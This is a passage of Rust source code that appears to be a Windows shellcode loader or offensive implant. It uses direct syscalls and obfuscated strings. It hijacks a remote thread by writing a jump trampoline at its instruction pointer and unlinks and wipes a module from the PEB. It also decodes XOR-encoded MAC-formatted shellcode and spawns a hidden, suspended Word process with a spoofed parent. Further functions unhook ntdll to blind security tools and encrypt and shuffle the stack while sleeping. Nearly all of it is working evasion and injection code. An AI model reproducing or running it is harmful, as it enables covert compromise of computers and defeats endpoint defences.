        let functions = module_base.add((*export_dir).AddressOfFunctions as usize) as *const u32;
        let names = module_base.add((*export_dir).AddressOfNames as usize) as *const u32;
        let ordinals = module_base.add((*export_dir).AddressOfNameOrdinals as usize) as *const u16;

        for i in 0..(*export_dir).NumberOfNames {
            let name_rva = *names.add(i as usize);
            let name_ptr = module_base.add(name_rva as usize) as *const c_char;
            let name_str = CStr::from_ptr(name_ptr).to_str().unwrap_or("");

            if name_str == function_name {
                let ordinal = *ordinals.add(i as usize) as usize;
                let function_rva = *functions.add(ordinal);
                let function_ptr = module_base.add(function_rva as usize) as *mut c_void;
                return Ok(function_ptr);
            }
        }

        Err(obfstr!("Function not found").to_owned())
    }

}


fn get_remote_thread_handle(process_id: u32) -> Result<HANDLE, String> {
    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: ULONG = 0;

    let status = unsafe {
        syscall!(
            "ZwQuerySystemInformation",
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.capacity() as ULONG,
            &mut return_length
        )
    };

    if !NT_SUCCESS(status) {
        return Err(obfstr!("Failed to call ZwQuerySystemInformation").to_owned());
    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let system_dlls = [lc!("kernel32.dll"),lc!("ntdll.dll")];
    let mut system_dll_bases: Vec<*mut u8> = Vec::new();
    for dll in &system_dlls {
        if let Ok(base) = get_module_base_by_name(dll, process_id) {
            system_dll_bases.push(base);
        }
    }

    let mut offset: usize = 0;
    let mut potential_threads: Vec<(&SYSTEM_THREAD_INFORMATION, LARGE_INTEGER)> = Vec::new();


    while offset < buffer.len() {
        let process_info: &SYSTEM_PROCESS_INFORMATION = unsafe { &*(buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION) };

        if process_info.UniqueProcessId == process_id as PVOID {
            let thread_array_base = (process_info as *const _ as usize) + std::mem::size_of::<SYSTEM_PROCESS_INFORMATION>() - std::mem::size_of::<SYSTEM_THREAD_INFORMATION>();

            println!("{} {}", lc!("[*] Threads Found:"), process_info.NumberOfThreads);

            for i in 0..process_info.NumberOfThreads as usize {
                let thread_info_ptr = (thread_array_base + i * std::mem::size_of::<SYSTEM_THREAD_INFORMATION>()) as *const SYSTEM_THREAD_INFORMATION;
                let current_thread_info = unsafe { &*thread_info_ptr };

                potential_threads.push((current_thread_info, current_thread_info.UserTime));
            }
        }

        if process_info.NextEntryOffset == 0 {
            break;
        }
        offset += process_info.NextEntryOffset as usize;
    }

    // Sort the potential threads based on the ranking criteria
    potential_threads.sort_by(|&(a, a_time), &(b, b_time)| {
        let a_system_dll = system_dll_bases.iter().any(|&dll_base| {
            (a.StartAddress as *mut u8) >= dll_base && (a.StartAddress as *mut u8) < unsafe { dll_base.add(0x1000000) }
        });
        let b_system_dll = system_dll_bases.iter().any(|&dll_base| {
            (b.StartAddress as *mut u8) >= dll_base && (b.StartAddress as *mut u8) < unsafe { dll_base.add(0x1000000) }
        });

        match (a_system_dll, b_system_dll) {
            (true, false) => std::cmp::Ordering::Less,
            (false, true) => std::cmp::Ordering::Greater,
            _ => {
                match a.BasePriority.cmp(&b.BasePriority) {
                    std::cmp::Ordering::Equal => unsafe { a_time.QuadPart().cmp(b_time.QuadPart())},
                    other => other
                }
            }
        }
    });

    let best_thread = potential_threads.first().map(|&(thread, _)| thread);

    println!("{} {}", lc!("[*] Selected best thread:"), best_thread.unwrap().ClientId.UniqueThread as u32);

    if let Some(thread_info) = best_thread {
        let mut thread_handle: HANDLE = null_mut();
        let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
        let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
        client_id.UniqueThread = thread_info.ClientId.UniqueThread;

        let status = unsafe {
            syscall!(
                "NtOpenThread",
                &mut thread_handle,
                THREAD_ALL_ACCESS,
                &mut object_attrs,
                &mut client_id
            )
        };

        if !NT_SUCCESS(status) {
            return Err(obfstr!("[-] Error: failed to open thread with NTSTATUS").to_owned());
        }

        return Ok(thread_handle);
    }

    Err(obfstr!("Failed to find suitable thread").to_owned())

}


fn jmp_hijack_thread(h_thread: HANDLE, p_address: PVOID, h_process: HANDLE) -> Result<(), String> {

    // Suspend the thread
    let status = unsafe { syscall!("NtSuspendThread", h_thread, std::ptr::null_mut::<ULONG>()) };
    if !NT_SUCCESS(status) {
        return Err(format!("[!] Failed to suspend thread with NTSTATUS: {:#X}", status));
    }

    // 1. Get the current thread context
    let mut context: CONTEXT = unsafe { std::mem::zeroed() };
    context.ContextFlags = CONTEXT_ALL;
    

    let status_get_context = unsafe { syscall!("NtGetContextThread", h_thread, &mut context as *mut _) };
    if !NT_SUCCESS(status_get_context) {
        return Err(obfstr!("[!] NtGetContextThread failed with NTSTATUS:").to_owned());
    }

    // 2. Backup the current memory at RIP
    let mut original_memory = [0u8; 12];
    let status_read_memory = unsafe {
        syscall!("NtReadVirtualMemory", h_process, context.Rip as *mut u8, original_memory.as_mut_ptr() as *mut _, original_memory.len() as SIZE_T, std::ptr::null_mut::<c_void>())
    };
    if !NT_SUCCESS(status_read_memory) {
        return Err(obfstr!("[!] NtReadVirtualMemory failed with NTSTATUS").to_owned());
    }

    // 3. Change memory protection to PAGE_READWRITE
    let mut old_protect = 0;
    let mut base_address = context.Rip as *mut u8;
    let status_protect_memory = unsafe {
        syscall!("NtProtectVirtualMemory", h_process, &mut base_address, &mut original_memory.len() as *mut _, PAGE_READWRITE, &mut old_protect as *mut _)
    };
    if !NT_SUCCESS(status_protect_memory) {
        return Err(obfstr!("[!] NtProtectVirtualMemory failed with NTSTATUS").to_owned());
    }

    // 4. Construct and write the trampoline directly to RIP location
    let mut trampoline = [
        0x48, 0xB8,                 // movabs rax, ...
        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, // placeholder bytes
        0xFF, 0xE0                  // jmp rax
    ];
    let p_address_bytes: [u8; 8] = unsafe { std::mem::transmute(p_address as u64) };
    trampoline[2..10].copy_from_slice(&p_address_bytes);

    // Write the trampoline to the instruction pointer (RIP) location
    let status_write_memory = unsafe {
        syscall!("NtWriteVirtualMemory", h_process, context.Rip as *mut u8, trampoline.as_ptr() as *const _, trampoline.len() as SIZE_T, std::ptr::null_mut::<c_void>())
    };
    if !NT_SUCCESS(status_write_memory) {
        return Err(format!("[!] NtWriteVirtualMemory failed with NTSTATUS: {:#X}", status_write_memory));
    }

    // 5. Restore the original memory protection
    let _ = unsafe {
        syscall!("NtProtectVirtualMemory", h_process, &mut base_address, &mut original_memory.len() as *mut _, old_protect, &mut old_protect as *mut _)
    };

    // 6. Optionally flush the instruction cache
    unsafe { syscall!("ZwFlushInstructionCache", h_process, context.Rip as *mut u8, trampoline.len() as SIZE_T) };

    let status = unsafe { syscall!("NtResumeThread", h_thread, std::ptr::null_mut::<ULONG>()) };
    if !NT_SUCCESS(status) {
        return Err(format!("[!] Failed to suspend thread with NTSTATUS: {:#X}", status));
    }

    Ok(())

}



fn unlink_module(module_name: &str, process_id: u32) -> Result<(), String> {
    let process_handle = get_process_handle(process_id)?;

    let process_basic_info = get_process_basic_info(process_handle as *mut c_void)?;
    let peb = get_peb(process_handle as *mut c_void, &process_basic_info)?;
    let ldr_data = get_peb_ldr_data(process_handle as *mut c_void, &peb)?;

    let mut ldr_entry: DLL_DATA_TABLE = unsafe { std::mem::zeroed() };
    let mut current = ldr_data.InLoadOrderModuleList.Flink;

    // Helper function to unlink LIST_ENTRY pointer remains the s


    loop {
        let ldr_entry_address = (current as usize - offset_of!(DLL_DATA_TABLE, InLoadOrderLinks)) as *mut DLL_DATA_TABLE;
        let status = unsafe {
            syscall!(
                "ZwReadVirtualMemory",
                process_handle as *mut c_void,
                ldr_entry_address as PVOID,
                &mut ldr_entry as *mut DLL_DATA_TABLE as *mut c_void,
                size_of::<DLL_DATA_TABLE>() as SIZE_T,
                std::ptr::null_mut::<c_void>()
            )
        };

        if status != 0 {
            return Err(obfstr!("Failed to call ZwReadVirtualMemory").to_owned());
        }

        let module_name_length = ldr_entry.FullDllName.Length as usize;
        let mut module_name_vec = vec![0u16; module_name_length / 2];
        let status = unsafe {
            syscall!(
                "ZwReadVirtualMemory",
                process_handle as *mut c_void,
                ldr_entry.FullDllName.Buffer as PVOID,
                module_name_vec.as_mut_ptr() as *mut c_void,
                module_name_length as SIZE_T,
                std::ptr::null_mut::<c_void>()
            )
        };

        if status != 0 {
            return Err(obfstr!("Failed to read module name with error").to_owned());
        }

        let current_module_name_with_path = String::from_utf16_lossy(&module_name_vec).trim().to_lowercase();
        let current_module_name = std::path::Path::new(&current_module_name_with_path)
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or_default();

        let target_module_name = module_name.trim().to_lowercase();

        if current_module_name == target_module_name {
            if unlink_entry(process_handle as *mut c_void, ldr_entry.InLoadOrderLinks.Blink, ldr_entry.InLoadOrderLinks.Flink) {
            } else {
                return Err(obfstr!("Failed to unlink InLoadOrderLinks").to_string());
            }

            if unlink_entry(process_handle as *mut c_void, ldr_entry.InMemoryOrderLinks.Blink, ldr_entry.InMemoryOrderLinks.Flink) {
                
            } else {
                return Err(obfstr!("Failed to unlink InMemoryOrderLinks").to_string());
            }

            if unlink_entry(process_handle as *mut c_void, ldr_entry.InInitializationOrderLinks.Blink, ldr_entry.InInitializationOrderLinks.Flink) {
                
            } else {
                return Err(obfstr!("Failed to unlink InInitializationOrderLinks").to_string());
            }

            if unlink_entry(process_handle as *mut c_void, ldr_entry.HashTableEntry.Blink, ldr_entry.HashTableEntry.Flink) {
                
            } else {
                return Err(obfstr!("Failed to unlink HashTableEntry").to_string());
            }

            if !erase_dll_names(process_handle as *mut c_void, &ldr_entry) {
                println!("{}", lc!("Failed to erase DLL names"));
                panic!("{}",obfstr!("Failed to erase DLL names"));
            }
            
            let ldr_entry_address = (current as usize - offset_of!(DLL_DATA_TABLE, InLoadOrderLinks)) as *mut DLL_DATA_TABLE;

            if !erase_dll_base(process_handle as *mut c_void, ldr_entry_address) {
                println!("Failed to erase DLL base");
                panic!("Failed to erase DLL base");
            }
            
            if !erase_dos_magic_bytes(process_handle as *mut c_void, ldr_entry.DllBase as usize) {
                panic!("Failed to erase DLL header");
            }
            
            println!("{}",lc!("[+] Module unlinked from PEB successfully"));
            unsafe { syscall!("ZwClose", process_handle as *mut c_void) };
            return Ok(());
        }

        if current == ldr_data.InLoadOrderModuleList.Blink {
            break;
        }

        current = ldr_entry.InLoadOrderLinks.Flink;
    }

    Err(obfstr!("Failed to find and unlink the module").to_string())

}


fn unlink_entry(process_handle: *mut c_void, prev_entry: *mut LIST_ENTRY, next_entry: *mut LIST_ENTRY) -> bool {
        // Update prev_entry's Flink
        if !prev_entry.is_null() {
            let updated_flink_data = next_entry;
            let write_status = unsafe {
                syscall!(
                    "ZwWriteVirtualMemory",
                    process_handle,
                    &(*prev_entry).Flink as *const _ as PVOID,
                    &updated_flink_data as *const _ as *mut c_void,
                    std::mem::size_of_val(&updated_flink_data) as SIZE_T,
                    std::ptr::null_mut::<c_void>()
                )
            };

            if write_status != 0 {
                println!("Failed to update prev_entry's Flink with error: {}", write_status);
                return false;
            }
        }

        // Update next_entry's Blink
        if !next_entry.is_null() {
            let updated_blink_data = prev_entry;
            let write_status = unsafe {
                syscall!(
                    "ZwWriteVirtualMemory",
                    process_handle,
                    &(*next_entry).Blink as *const _ as PVOID,
                    &updated_blink_data as *const _ as *mut c_void,
                    std::mem::size_of_val(&updated_blink_data) as SIZE_T,
                    std::ptr::null_mut::<c_void>()
                )
            };
            if write_status != 0 {
                println!("Failed to update next_entry's Blink with error: {}", write_status);
                return false;
            }
        }
        
        true

}


fn erase_dll_names(process_handle: *mut c_void, ldr_entry: &DLL_DATA_TABLE) -> bool {
    let fake_dll_name = "kernel32.dll\0".encode_utf16().collect::<Vec<u16>>();
    let full_name_length = ldr_entry.FullDllName.Length as usize;
    let mut fake_name_vec = fake_dll_name.repeat(full_name_length / fake_dll_name.len());

    let status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            ldr_entry.FullDllName.Buffer as PVOID,
            fake_name_vec.as_mut_ptr() as *mut c_void,
            full_name_length as SIZE_T,
            std::ptr::null_mut::<c_void>()
        )
    };

    if status != 0 {
        return false;
    }

    let base_name_length = ldr_entry.BaseDllName.Length as usize;
    let mut fake_base_name_vec = fake_dll_name.repeat(base_name_length / fake_dll_name.len());
    let status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            ldr_entry.BaseDllName.Buffer as PVOID,
            fake_base_name_vec.as_mut_ptr() as *mut c_void,
            base_name_length as SIZE_T,
            std::ptr::null_mut::<c_void>()
        )
    };

    if status != 0 {
        return false;
    }

    true

}


fn erase_dll_base(process_handle: *mut c_void, ldr_entry_address: *mut DLL_DATA_TABLE) -> bool {
    let fake_dll_base = 0x7FFF0000 as PVOID;
    let status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            &(*ldr_entry_address).DllBase as *const _ as PVOID,
            &fake_dll_base as *const _ as *mut c_void,
            std::mem::size_of_val(&fake_dll_base) as SIZE_T,
            std::ptr::null_mut::<c_void>()
        )
    };

    if status != 0 {
        return false;
    }

    true

}


fn erase_dos_magic_bytes(process_handle: *mut c_void, module_base: usize) -> bool {
    // Offset to the DOS magic bytes (right at the start of the module)
    let mut magic_offset = module_base;
    
    // Size of the DOS magic bytes
    let mut magic_size = 2usize; // "MZ" is 2 bytes

    // Changing protection to PAGE_READWRITE
    let mut old_perms: ULONG = 0;
    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process_handle,
            &mut magic_offset as *mut _,
            &mut magic_size,
            PAGE_READWRITE,
            &mut old_perms
        )
    };

    if protect_status != 0 {
        panic!("Failed to change memory protection");
    }

    // Create a buffer to zero out only the 2 magic bytes
    let zeroed_magic_vec = [0u8; 2];
    let status = unsafe {
        syscall!(
            "NtWriteVirtualMemory",
            process_handle,
            magic_offset as PVOID,
            zeroed_magic_vec.as_ptr() as *const c_void,
            magic_size as SIZE_T,
            std::ptr::null_mut::<c_void>()
        )
    };

    // Reverting memory protection back to its original state
    let _ = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process_handle,
            &mut magic_offset as *mut _,
            &mut magic_size,
            old_perms,
            &mut old_perms
        )
    };  // added an underscore to ignore the return value; add error handling if needed

    // Return false if the write operation failed
    status == 0

}


fn mac_to_bytes(shellcode: &[&str]) -> Vec<u8> {
    let mut bytes = Vec::new();

    for code in shellcode {
        let split_codes = code.split('-');
        for split_code in split_codes {
            let byte = u8::from_str_radix(split_code, 16).unwrap();
            bytes.push(byte ^ KEY);  // XOR each byte with the key
        }
    }

    bytes

}


fn get_process_basic_info(process_handle: HANDLE) -> Result<PROCESS_BASIC_INFORMATION, String> {
    let mut process_basic_info: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed::<PROCESS_BASIC_INFORMATION>() };
    let mut return_length: ULONG = 0;
    
    let status = unsafe {
        syscall!(
            "ZwQueryInformationProcess",
            process_handle as *mut c_void,
            ProcessBasicInformation,
            &mut process_basic_info as *mut PROCESS_BASIC_INFORMATION as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            &mut return_length
        )
    };

    if status != 0 {
        return Err(obfstr!("Failed to call ZwQueryInformationProcess").to_owned());
    }

    Ok(process_basic_info)

}


fn get_peb(process_handle: HANDLE, process_basic_info: &PROCESS_BASIC_INFORMATION) -> Result<PEB, String> {
    let pbi = process_basic_info.PebBaseAddress;
    let mut peb: PEB = unsafe { std::mem::zeroed::<PEB>() };

    let status = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle as *mut c_void,
            pbi as PVOID,
            &mut peb as *mut PEB as *mut c_void,
            size_of::<PEB>() as SIZE_T,
            std::ptr::null_mut::<c_void>()
        )
    };

    if status != 0 {
        return Err(obfstr!("Failed to read PEB").to_owned());
    }

    Ok(peb)

}


fn get_peb_ldr_data(process_handle: HANDLE, peb: &PEB) -> Result<PEB_LDR_DATA, String> {
    let mut ldr_data: PEB_LDR_DATA = unsafe { std::mem::zeroed::<PEB_LDR_DATA>() };

    let status = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle as *mut c_void,
            peb.Ldr as PVOID,
            &mut ldr_data as *mut PEB_LDR_DATA as *mut c_void,
            size_of::<PEB_LDR_DATA>() as SIZE_T,
            std::ptr::null_mut::<c_void>()
        )
    };

    if status != 0 {
        return Err(obfstr!("Failed to read PEB_LDR_DATA").to_owned());
    }

    Ok(ldr_data)

}


fn get_process_handle(process_id: u32) -> Result<isize, String> {
    let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
    let mut handle: HANDLE = null_mut();

    client_id.UniqueProcess = process_id as *mut c_void;

    let status = unsafe {
        syscall!(
        "NtOpenProcess",
            &mut handle,
            PROCESS_ALL_ACCESS,
            &mut object_attrs,
            &mut client_id)
    };

    if status != 0 {
        panic!("{}", lc!("[-] Error: failed to open process"));
    }

    Ok(handle as isize)

}


fn read_memory<T>(process_handle: *mut c_void, address: usize) -> Result<T, String> {
    let mut buffer: T = unsafe { std::mem::zeroed() };
    let buffer_size = std::mem::size_of::<T>();

    let status = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle as *mut c_void,
            address as PVOID,
            &mut buffer as *mut T as *mut c_void,
            buffer_size as SIZE_T,
            std::ptr::null_mut::<c_void>()
        )
    };

    if status != 0 {

        panic!("{} {:p} {} {:#X}", lc!("Failed to read memory at address"),  address as *const u8, lc!("with NTSTATUS:"), status);
    }

    Ok(buffer)

}


fn spawn_process(ppid: u64, process: &mut Process) {
    unsafe {

// C:\\Program Files\\Internet Explorer\\iexplore.exe
// C:\\Windows\\System32\\mmc.exe
// C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE

        let nt_image_path = U16CString::from_str("\\??\\C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE").unwrap();
        let current_directory = U16CString::from_str("\\??\\C:\\Program Files\\Microsoft Office\\root\\Office16").unwrap();
        let command_line = U16CString::from_str(" ").unwrap();

        let mut nt_image_path_us = UNICODE_STRING {
            Length: (nt_image_path.len() * 2) as u16,
            MaximumLength: (nt_image_path.len() * 2) as u16,
            Buffer: nt_image_path.into_raw() as *mut _,
        };

        let mut current_directory_us = UNICODE_STRING {
            Length: (current_directory.len() * 2) as u16,
            MaximumLength: (current_directory.len() * 2) as u16,
            Buffer: current_directory.into_raw() as *mut _,
        };

        let mut command_line_us = UNICODE_STRING {
            Length: (command_line.len() * 2) as u16,
            MaximumLength: (command_line.len() * 2) as u16,
            Buffer: command_line.into_raw() as *mut _,
        };

        let mut process_parameters: *mut _ = std::ptr::null_mut();
        RtlCreateProcessParametersEx(
            &mut process_parameters,
            &mut nt_image_path_us as *mut _,
            std::ptr::null_mut(),
            &mut current_directory_us,
            &mut command_line_us,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x01,
        );

        // Uncomment those 2 lines to start the prcoess in "Hidden" State

        (*process_parameters).WindowFlags |= STARTF_USESHOWWINDOW;
        (*process_parameters).ShowWindowFlags = SW_HIDE as u32;

        // Obtain handle to parent (e.g., explorer.exe with PID 10104)
        let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
        let mut cid = CLIENT_ID {
            UniqueProcess: ppid as HANDLE, // Hardcoded PID for explorer.exe
            UniqueThread: null_mut(),
        };
        
        let mut hParent: HANDLE = null_mut();
        syscall!("NtOpenProcess",&mut hParent, PROCESS_ALL_ACCESS, &mut oa, &mut cid);

        // Adjust the PS_ATTRIBUTE_LIST to hold 3 attributes
        let mut attribute_list: PS_ATTRIBUTE_LIST = std::mem::zeroed();
        attribute_list.TotalLength = size_of::<PS_ATTRIBUTE_LIST>() as _;


        // Initialize the PS_CREATE_INFO structure
        let mut create_info: PS_CREATE_INFO = std::mem::zeroed();
        create_info.Size = size_of::<PS_CREATE_INFO>() as _;

        attribute_list.Attributes[0].Attribute = 0x20005; // PS_ATTRIBUTE_IMAGE_NAME 
        attribute_list.Attributes[0].Size = nt_image_path_us.Length as usize;
        attribute_list.Attributes[0].u.Value = nt_image_path_us.Buffer as usize;


        // Set Parent Process attribute
        attribute_list.Attributes[1].Attribute = 0x00060000;
        attribute_list.Attributes[1].Size = size_of::<HANDLE>();
        attribute_list.Attributes[1].u.ValuePtr = hParent; 

        // BlockDLLs policy
        let policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        attribute_list.Attributes[2].Attribute = 0x20010 as usize;
        attribute_list.Attributes[2].Size = size_of::<u64>();
        attribute_list.Attributes[2].u.ValuePtr = &policy as *const _ as *mut c_void;

            
        let mut h: HANDLE = null_mut();
        let mut t: HANDLE = null_mut();
        let r2 = 
            syscall!(
                "NtCreateUserProcess",
                &mut h, 
                &mut t, 
                (0x000F0000) |  (0x00100000) | 0xFFFF, //PROCESS_ALL_ACCESS
                (0x000F0000) |  (0x00100000) | 0xFFFF, //THREAD_ALL_ACCESS
                null_mut::<usize>(), 
                null_mut::<usize>(), 
                0x00000001, // 0x00000001 For susspended
                0x1, // 0x1 For susspended
                process_parameters as *mut _, 
                &mut create_info as *mut _, 
                &mut attribute_list as *mut _
        );
        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let status = 
            syscall!(
                "NtQueryInformationProcess",
                h, 
                ProcessBasicInformation, 
                &mut pbi as *mut _ as *mut c_void,
                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
                null_mut::<usize>()
        );

        if status == 0 || r2 == 0 {
            process.process_id = pbi.UniqueProcessId as u32;
            process.process_handle = h as isize;
            process.thread_handle = t as *mut c_void;
            let mut return_length: ULONG = 0;
            let mut buffer: [WCHAR; 1024] = [0; 1024];
            let status = syscall!(
                "NtQueryInformationProcess",
                h,
                ProcessImageFileName,
                &mut buffer as *mut _ as *mut c_void,
                1024 * std::mem::size_of::<WCHAR>() as ULONG,
                &mut return_length
            );
            if status == 0 {
                let len = return_length as usize / std::mem::size_of::<WCHAR>();
                let path = String::from_utf16(&buffer[..len]).expect("Failed to convert WCHAR buffer to String");
                
                if let Some(filename) = path.split('\\').last() {
                    process.process_name = filename.to_owned();
                }
            }

        } else {
            println!("NTSTATUS: {:x}", r2);
            println!("Error querying process info: {:?}", status);
        }
        // 11. Close the handle to the parent process.

        syscall!("ZwClose",hParent as *mut c_void);

        // 12. Free any allocated memory.
        RtlDestroyProcessParameters(process_parameters);
    }

}



fn unhook_ntdll(remote_process: &mut Process, write_to_remote: bool) {
    

    // Get the current process ID and handle
    let current_process_id = GetCurrentProcessId().unwrap_or_else(|err| panic!("{}", err));
    let current_process_handle = if write_to_remote {
        get_process_handle(remote_process.process_id).unwrap_or_else(|err| {
            println!("Error getting remote process handle: {}", err);
            panic!("{}", err);
        }) as *mut c_void // Casting to *mut c_void if needed
    } else {
        GetCurrentProcessHandle().unwrap_or_else(|err| {
            println!("Error getting current process handle: {}", err);
            panic!("{}", err);
        })
    };

    if write_to_remote {
        println!("[+] Unhooking the NTDLL for Process with PID {}.",remote_process.process_id);
    }else {
        println!("[+] Unhooking the NTDLL for Process with PID {}.",current_process_id);
    };

    // Get the base address of ntdll.dll using the current process's information
    let ntdll_base = get_module_base_by_name("ntdll.dll", current_process_id).unwrap_or_else(|err| panic!("{}", err));
    
    // Find the .text section of ntdll in the remote process
    let text_section_offset = find_rx_section_offset(remote_process, ntdll_base as usize).expect("Failed to find rx section offset");
    let text_section_size = find_rx_section_size(remote_process, ntdll_base as usize).expect("Failed to get rx section size");
    
    // Read the pristine .text section from the remote process
    let mut buffer: Vec<u8> = vec![0; text_section_size as usize];
    let mut bytes_read: SIZE_T = 0;
    let status = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            remote_process.process_handle,
            (ntdll_base as usize + text_section_offset as usize) as *mut c_void,
            buffer.as_mut_ptr() as *mut c_void,
            text_section_size as SIZE_T,
            &mut bytes_read)
    };

    if status != 0 || bytes_read != text_section_size as SIZE_T {
        println!("Failed to read memory from remote process. Status: {}, Bytes Read: {}", status, bytes_read);
        panic!("Failed to read the .text section of ntdll.dll from the remote process");
    }

    if write_to_remote {
        unsafe { syscall!("NtResumeThread", remote_process.thread_handle) };
        encrypted_sleep(5000);
    }
    // Overwrite the .text section of ntdll in the destination process (either current or remote) with the pristine copy
    let base_address = (ntdll_base as usize + text_section_offset as usize) as *mut c_void;
    let mut size_to_protect = text_section_size as SIZE_T;
    let mut old_protect: DWORD = 0;
    
    // Change protection of the target area to PAGE_READWRITE
    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            current_process_handle,
            &base_address, 
            &mut size_to_protect, 
            PAGE_EXECUTE_READWRITE,
            &mut old_protect)
    };

    if protect_status != 0 {
        println!("Failed to change memory protection. Status: {:#X}", protect_status);
        panic!("Failed to change the memory protection to PAGE_READWRITE");
    }

    let mut bytes_written: SIZE_T = 0;
    let write_status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            current_process_handle,
            base_address,
            buffer.as_ptr() as *mut c_void,
            text_section_size as SIZE_T,
            &mut bytes_written)
    };

    if write_status != 0 || bytes_written != text_section_size as SIZE_T {
        println!("Failed to write memory. Status: {:#X}, Bytes Written: {}", write_status, bytes_written);
        panic!("Failed to overwrite the .text section of ntdll.dll");
    }

    // Restore original protection
    let restore_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            current_process_handle,
            &base_address, 
            &mut size_to_protect, 
            old_protect,
            &mut old_protect)
    };

    if restore_status != 0 {
        println!("Failed to restore memory protection. Status: {:#X}", restore_status);
        panic!("Failed to restore the original memory protection");
    }


    if write_to_remote {
        println!("[+] Unhooking the NTDLL from PID {} completed successfully.",remote_process.process_id);
    }else {
        println!("[+] Unhooking the NTDLL from PID {} completed successfully.",current_process_id);
    };


}


fn GetCurrentProcessId() -> Result<u32, String> {
    let pseudo_handle = -1isize as *mut c_void;
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let status = unsafe {
        syscall!(
            "NtQueryInformationProcess",
            pseudo_handle,
            ProcessBasicInformation,
            &mut pbi as *mut _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            std::ptr::null_mut::<usize>())
    };
    if status != 0 {
        Err(obfstr!("Failed to query process basic information").to_owned())
    } else {
        Ok(pbi.UniqueProcessId as u32)
    }

}


fn GetCurrentProcessHandle() -> Result<HANDLE, i32> {
    let pseudo_handle = -1isize as HANDLE;
    let mut real_handle: HANDLE = null_mut();

    let status = unsafe {
        syscall!(
            "NtDuplicateObject",
            pseudo_handle,
            pseudo_handle,
            pseudo_handle,
            &mut real_handle,
            PROCESS_ALL_ACCESS,
            0,
            DUPLICATE_SAME_ACCESS
        )
    };

    if status == 0 {
        Ok(real_handle)
    } else {
        Err(status)
    }

}


fn shuffle_stack(p: *mut u8, stack_size: usize) -> Vec<usize> {
    let mut order: Vec<usize> = (0..stack_size).collect();
    order.shuffle(&mut rand::thread_rng()); // Using rand crate for shuffling
    
    let mut shuffled_stack = vec![0u8; stack_size];
    for (i, &pos) in order.iter().enumerate() {
        unsafe {
            shuffled_stack[i] = *p.add(pos);
        }
    }
    
    for i in 0..stack_size {
        unsafe {
            *p.add(i) = shuffled_stack[i];
        }
    }
    
    order
}

fn restore_stack(p: *mut u8, stack_size: usize, order: Vec<usize>) {
    let mut original_stack = vec![0u8; stack_size];
    for i in 0..stack_size {
        unsafe {
            original_stack[order[i]] = *p.add(i);
        }
    }
    
    for i in 0..stack_size {
        unsafe {
            *p.add(i) = original_stack[i];
        }
    }
}




fn xor_encrypt(p: *mut u8, stack_size: usize, key: &[u8]) {
    let key_length = key.len();
    for i in 0..stack_size {
        unsafe {
            *p.add(i) ^= key[i % key_length];
        }
    }
}

unsafe extern "system" fn encrypt_thread(duration: PVOID) -> DWORD {


    let ms = *(duration as *const u64);
    println!("[+] Sleep duration: {} Sec", ms / 1000);

    let delay_interval = -(DELAY_MULTIPLIER * ms as i64);

    let key = b"It2H@Qp3Xe*sxdc#KA8)dbMtI5Q7&FK";

    let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
    let pseudo_handle = -1isize as *mut c_void;
    syscall!(
        "NtQueryVirtualMemory",
        pseudo_handle,
        duration,
        0,
        &mut mbi as *mut _ as PVOID,
        mem::size_of::<MEMORY_BASIC_INFORMATION>() as ULONG,
        std::ptr::null_mut::<c_void>()
    );

    let stack_region = (mbi.BaseAddress as isize - STACK_OFFSET) as *mut u8;
    let stack_base = (stack_region as isize + mbi.RegionSize as isize + STACK_OFFSET) as *mut u8;
    let stack_size = stack_base as usize - duration as *mut u8 as usize;

    // 1. Snapshot the current state of the stack
    let _stack_snapshot: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();

    // 2. Shuffle the stack
    let order = shuffle_stack(stack_region, stack_size);
    let _stack_after_shuffle: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();

    // 3. Encrypt the shuffled stack
    xor_encrypt(stack_region, stack_size, key);
    let _stack_after_encryption: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();



    let status = syscall!("NtDelayExecution",false as c_int, &delay_interval);
    if status < 0 {
        eprintln!("[-] NtDelayExecution failed with status: {:#X}", status);
    } else {
        println!("[+] Sleep done");
    }

